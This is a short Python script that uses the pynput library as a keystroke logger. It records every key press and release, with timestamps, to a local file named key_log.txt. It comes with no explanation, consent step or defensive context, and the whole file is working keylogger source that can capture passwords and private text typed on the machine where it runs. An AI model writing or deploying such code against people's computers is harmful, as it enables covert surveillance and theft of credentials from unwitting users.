from pynput import keyboard
import logging

logging.basicConfig(filename='key_log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def on_release(key):
    logging.info('Released: ' + str(key))

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
